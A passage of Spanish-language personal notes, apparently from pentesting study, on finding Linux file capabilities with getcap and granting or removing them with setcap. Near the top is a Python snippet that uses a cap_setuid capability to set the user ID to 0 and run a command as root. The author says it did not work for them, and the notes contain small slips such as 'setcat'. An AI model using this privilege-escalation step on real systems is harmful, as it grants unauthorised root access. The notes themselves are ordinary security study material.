
```
which python3.9 | xargs ls -l

lrwxrwxrwx 1 root root 9 Jul 28  2021 /usr/bin/python2 -> python2.7

>>import os
>>os.setuid(0)
>>os.system("whoami")
root
0
```

#### supongamos que es asi porque a mi no me funciono

#getcap  Permite listar las capabilities del sistema

`which getcap`

	`/usr/sbin/getcap`

#### podemos buscar en el sistema ficheros de forma recursiva (-r) que tengan capabilities

```
getcap -r / 2>/dev/null 

/usr/bin/ping cap_net_raw=ep
/usr/bin/dumpcap cap_net_admin,cap_net_raw=eip
/usr/bin/nmap cap_net_bind_service,cap_net_admin,cap_net_raw=eip
/usr/bin/fping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep

```

Son "capacidades" que previamente hay que configurar a determinados binarios para poder ejecutar ciertas tareas

*no es un indicativo de que sea vulnerable*

En este caso no tengo pero supongamos que tengo un:

```
`usr/bin/python3.9 cap_setuid=ep
```
Esto es una capabilitie que nos da el poder de modificar nuestra identidad de usuario

#### Para hacerlo ...

```
	#setcat cap_setuid=ep
```

De esta forma le permitimos que se pueda modificar el identificador, el uid

#### pero si se la queres sacar porque no da mas ...

```
setcap -r /usr/bin/python3.9
```

para asegurarte que se la sacaste

```
getcap !$

getcap /usr/bin/python3.9
```

# !$
se refiere al ultimo comando ejecutado


[todas las shells las podes ver en /etc/shells]

